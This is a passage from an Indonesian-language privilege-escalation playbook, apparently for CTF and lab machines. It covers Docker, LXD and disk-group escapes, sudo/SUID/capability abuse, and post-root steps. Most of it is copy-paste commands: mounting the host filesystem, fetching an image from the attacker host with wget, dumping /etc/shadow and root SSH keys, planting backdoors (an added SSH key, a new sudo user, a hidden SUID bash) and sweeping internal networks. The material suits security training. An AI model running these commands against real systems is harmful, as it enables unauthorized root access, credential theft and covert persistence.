docker run -it -v /:/mnt IMAGE_YANG_ADA chroot /mnt sh

# Method 4: Buat container privileged
docker run --privileged --rm -it alpine sh
# Di dalam container:
fdisk -l       # Lihat partisi
mount /dev/sda1 /mnt
chroot /mnt bash
```

**OUTPUT BERHASIL ✅ — Masuk ke container dengan akses host:**

text

```
/ # id
uid=0(root) gid=0(root) groups=0(root)
/ # cat /mnt/root/root.txt   # Jika pakai -v /:/mnt
/ # cat /root/root.txt       # Jika pakai chroot
```

**OUTPUT GAGAL ❌ — Image tidak ada:**

text

```
Unable to find image 'alpine:latest' locally
docker: Error response from daemon: Get "https://registry-1.docker.io/..."
```

➡️ Tidak ada internet/image. Cek image yang sudah ada:

Bash

```
docker images
# Gunakan image yang ada
docker run -it -v /:/mnt IMAGE_ID chroot /mnt sh
```

**OUTPUT GAGAL ❌ — Permission denied:**

text

```
docker: Got permission denied while trying to connect to the Docker daemon socket
```

➡️ Cek socket permission:

Bash

```
ls -la /var/run/docker.sock
# Harus ada 'rw' untuk group docker
# Jika tidak: mungkin group membership belum aktif di session ini
# Re-login atau: newgrp docker
```

---

### Fase 5B — LXD/LXC Group Escape

Bash

```
# Verifikasi membership
id | grep -E 'lxd|lxc'

# Cek LXD tersedia
lxd --version 2>/dev/null
lxc --version 2>/dev/null
```

**OUTPUT BERHASIL ✅ — LXD accessible:**

Bash

```
# DI MESIN ATTACKER: Build Alpine image
git clone https://github.com/saghul/lxd-alpine-builder.git /tmp/lxd-build
cd /tmp/lxd-build
./build-alpine 2>/dev/null
# Akan menghasilkan: alpine-v3.XX-x86_64-TIMESTAMP.tar.gz

# Serve file
python3 -m http.server 8000

# DI TARGET: Download image
cd /tmp
wget http://$LHOST:8000/alpine-v3.XX-x86_64-*.tar.gz

# Import image
lxc image import ./alpine-v3.XX-*.tar.gz --alias privesc
lxc image list   # Verifikasi

# Buat container privileged
lxc init privesc pwn -c security.privileged=true

# Mount host filesystem
lxc config device add pwn hostroot disk source=/ path=/mnt/root recursive=true

# Start dan masuk
lxc start pwn
lxc exec pwn /bin/sh

# Di dalam container - akses host:
id              # uid=0(root)
ls /mnt/root/root/
cat /mnt/root/root/root.txt
```

**OUTPUT GAGAL ❌ — lxd not initialized:**

text

```
Error: LXD not initialized; use `lxd init`
```

➡️ Coba inisialisasi:

Bash

```
lxd init --auto
# Kemudian ulangi langkah di atas
```

---

### Fase 5C — Disk Group Abuse

Bash

```
# Verifikasi membership
id | grep disk

# Lihat block devices
lsblk
df -h

# Gunakan debugfs untuk akses filesystem langsung
debugfs /dev/sda1   # Sesuaikan dengan device yang ada

# Di dalam debugfs:
# debugfs: ls /root
# debugfs: cat /root/root.txt
# debugfs: cat /etc/shadow
```

**OUTPUT BERHASIL ✅:**

text

```
debugfs 1.46.5 (30-Dec-2021)
debugfs:  cat /root/root.txt
HTB{flag_here}
```

---

## ═══════════════════════════════════════

## FASE 6: POST-EXPLOITATION SETELAH ROOT

## ═══════════════════════════════════════

### Langkah 6.1 — Verifikasi Root

Bash

```
# WAJIB setelah setiap exploit attempt
whoami            # → root
id                # → uid=0(root) gid=0(root) groups=0(root)
id -u             # → 0

# Jika hanya EUID=0 (masih bisa dibatasi beberapa hal)
id
# uid=1001(alice) gid=1001(alice) euid=0(root)
# Upgrade ke full root:
python3 -c 'import os; os.setuid(0); os.setgid(0); os.execl("/bin/bash","bash")'
```

---

### Langkah 6.2 — Ambil Flag & Credentials

Bash

```
# Flag
cat /root/root.txt
cat /root/proof.txt      # Proving Grounds
cat /root/flag.txt

# Dump semua credentials untuk lateral movement
# /etc/shadow (untuk crack offline)
cat /etc/shadow | tee ~/privesc_loot/creds/shadow.txt

# Root SSH key (untuk persistent access)
cat /root/.ssh/id_rsa | tee ~/privesc_loot/creds/root_id_rsa

# Authorized keys (untuk backdoor)
cat /root/.ssh/authorized_keys

# History files (sering ada password)
cat /root/.bash_history
cat /root/.zsh_history

# Dump semua credentials dari sistem
grep -ri "password" /etc/ 2>/dev/null | grep -v "^Binary"
grep -ri "password" /var/www/ 2>/dev/null | grep -v "^Binary" | head -20
```

---

### Langkah 6.3 — Buat Backdoor (untuk CTF/Lab persistence)

Bash

```
# Method 1: Tambah SSH key kita ke root
mkdir -p /root/.ssh
echo "SSH_PUBLIC_KEY_KAMU" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
# Kemudian: ssh root@$TARGET_IP

# Method 2: Set password root
echo "root:NewRootPass123!" | chpasswd
su root   # atau ssh root@$TARGET_IP

# Method 3: Tambah user admin baru
useradd -m -s /bin/bash hacker
echo "hacker:hacker123" | chpasswd
usermod -aG sudo hacker

# Method 4: Buat SUID bash (persistent escalation path)
cp /bin/bash /tmp/.hidden_bash
chmod +s /tmp/.hidden_bash
/tmp/.hidden_bash -p   # Kapanpun butuh root
```

---

### Langkah 6.4 — Pivot ke Target Lain (jika network pentest)

Bash

```
# Lihat network interfaces
ip addr
ifconfig
ip route

# Lihat koneksi aktif
ss -tunp
netstat -tunp 2>/dev/null

# Lihat ARP table (potential targets)
arp -n
ip neigh

# Scan network internal dari root shell
# (lebih credible karena root punya akses lebih luas)
for i in $(seq 1 254); do 
  ping -c 1 -W 1 10.10.11.$i 2>/dev/null | grep "64 bytes" &
done
wait

# Dump credentials untuk lateral movement
# SAM/NTLM equivalent di Linux: /etc/shadow
impacket-secretsdump -target-ip $TARGET_IP admin:password@$TARGET_IP 2>/dev/null
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`sudo -l` hang|Shell bukan TTY|Upgrade shell: `python3 -c 'import pty; pty.spawn("/bin/bash")'`|
|`sudo: a password is required`|Rule butuh password|Cari credential di file config, history, SMB|
|`Sorry, user may not run sudo`|Tidak ada sudo rule|Lanjut ke SUID/capabilities|
|`bash -p` tidak menghasilkan root|Binary tidak SUID root|Cek `ls -la /bin/bash` - harus ada `s`|
|`S` besar pada SUID|Execute bit tidak aktif|Tidak bisa dieksekusi normal, skip|
|`getcap: command not found`|Tidak di PATH|Coba `/sbin/getcap` atau `/usr/sbin/getcap`|
|`python3 os.setuid(0) gagal`|Tidak punya cap_setuid|Re-cek `getcap /usr/bin/python3`|
|`LD_PRELOAD tidak bekerja`|env_reset aktif|Cek `sudo -l` untuk env_reset, cari vector lain|
|`find` SUID scan lambat|Filesystem besar|Batasi: `find /usr /bin /sbin /opt -perm -4000`|
|`docker: permission denied`|Socket tidak accessible|`newgrp docker` atau re-login|
|`lxc: Error: LXD not initialized`|LXD belum setup|`lxd init --auto`|
|PATH injection gagal|Binary pakai absolute path|Gunakan strace untuk konfirmasi|
|Library hijacking gagal|Nama library tidak cocok|`ldd binary` → cari nama exact yang "not found"|
|ltrace tidak ada|Tool tidak terinstall|Gunakan `strace` sebagai pengganti|
|strace: Operation not permitted|ptrace dibatasi|Gunakan static analysis: `strings`, `file`|
|Custom binary crash langsung|Input/argument salah|Coba `./binary --help` atau tanpa argument dulu|

**Jika semua fase di atas gagal — lanjut ke:**

text

```
→ <a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>  (Cron jobs, writable files, services, kernel exploits)
→ <a href="/docs/hash-cracking" class="text-[#00b4d8] hover:underline font-mono font-semibold">54_hash_cracking_workflow.md</a>  (Crack shadow file yang didapat)
→ <a href="/docs/pivoting-tunneling" class="text-[#00b4d8] hover:underline font-mono font-semibold">64_pivoting_tunneling_workflow.md</a>  (Jika ada network lain yang accessible)
```

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Low-privilege shell di Linux
│
├─ FASE 0: Identity Check
│   ├─ uid=0 → Sudah root! cat /root/root.txt
│   ├─ docker group → FASE 5A (Docker Escape)
│   ├─ lxd/lxc group → FASE 5B (LXD Escape)
│   └─ disk group → FASE 5C (debugfs)
│
├─ FASE 1: sudo -l
│   ├─ NOPASSWD binary → GTFOBins → ROOT
│   ├─ ALL commands → sudo -i → ROOT
│   ├─ Wildcard → Argument injection → ROOT
│   ├─ env_keep LD_PRELOAD → Malicious .so → ROOT
│   ├─ Specific binary (need password) → Cari credential dulu
│   └─ Tidak ada sudo → FASE 2
│
├─ FASE 2: SUID Scan
│   ├─ Interpreter SUID (python/perl/ruby) → setuid(0) → ROOT
│   ├─ Bash SUID → bash -p → ROOT
│   ├─ Editor SUID (vim/nano) → Shell escape → ROOT
│   ├─ Custom binary → strings+strace
│   │   ├─ Calls command without absolute path → PATH injection → ROOT
│   │   └─ Missing library in writable path → Library hijacking → ROOT
│   └─ Tidak ada yang menarik → FASE 3
│
├─ FASE 3: Capabilities
│   ├─ cap_setuid → setuid(0) → ROOT
│   ├─ cap_dac_read_search → Baca shadow/SSH key → Crack → ROOT
│   ├─ cap_dac_override → Tulis /etc/passwd → ROOT
│   └─ Tidak ada → FASE 4
│
├─ FASE 4: LinPEAS
│   └─ Analisis output → Temukan vector lain
│
└─ FASE 5: Special Groups
    ├─ docker → Mount host → ROOT
    ├─ lxd → Privileged container → ROOT
    └─ disk → debugfs → Baca filesystem langsung
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === TRIAGE (30 DETIK) ===
id; whoami; groups; sudo -l; find / -perm -4000 -type f 2>/dev/null | head -20; getcap -r / 2>/dev/null

# === SHELL UPGRADE ===
python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm; stty rows 50 cols 200

# === SUDO EXPLOITS ===
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo perl -e 'exec "/bin/bash"'
sudo find . -exec /bin/bash \; -quit
sudo vim -c ':!/bin/bash'
sudo awk 'BEGIN {system("/bin/bash")}'
sudo -i  # Jika ALL

# === SUID SCANS ===
find / -perm -4000 -type f 2>/dev/null
find / -user root -perm -4000 -type f 2>/dev/null

# === SUID EXPLOITS ===
/bin/bash -p                                                    # SUID bash
python3 -c 'import os; os.execl("/bin/sh","sh","-p")'          # SUID python
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash"'  # SUID perl
find . -exec /bin/sh -p \; -quit                                # SUID find

# === CAPABILITY SCAN ===
getcap -r / 2>/dev/null

# === CAPABILITY EXPLOITS ===
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'   # cap_setuid
python3 -c 'print(open("/etc/shadow").read())'                 # cap_dac_read_search
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash"'  # cap_setuid perl

# === DOCKER ESCAPE ===
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# === PATH INJECTION ===
cat > /tmp/FAKECMD << 'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x /tmp/FAKECMD
export PATH=/tmp:$PATH
/path/to/suid/binary

# === VERIFY ROOT ===
whoami; id; id -u; cat /root/root.txt

# === DUMP CREDS AFTER ROOT ===
cat /etc/shadow
cat /root/.ssh/id_rsa
cat /root/.bash_history
```

---

> **➡️ NEXT:** Setelah berhasil root, credentials yang didapat (hash dari /etc/shadow, SSH keys) bisa digunakan di **[🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc)** untuk persistence, atau di **[🧭 Workflow 42 — Lateral Movement](/docs/lateral-movement)** untuk pivot ke mesin lain di jaringan yang sama. Hash dari shadow bisa di-crack menggunakan **[🔐 File 54 — Hash Cracking Workflow](/docs/hash-cracking)**.

[](https://messages-prod.27c852f3500f38c1e7786e2c9ff9e48f.r2.cloudflarestorage.com/aad5bafd-ac04-4d8f-9667-3d87b6995a58/1789143859916-47_sudo_suid_capabilities_workflow.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=b33de61d4f22a31b59b25364ab5037c5%2F20260911%2Fauto%2Fs3%2Faws4_request&X-Amz-Date=20260911T162423Z&X-Amz-Expires=3600&X-Amz-Signature=81556964bd80501421df2f9346641636ae61e4af41b2d3cf3df47a2abb95e45f&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)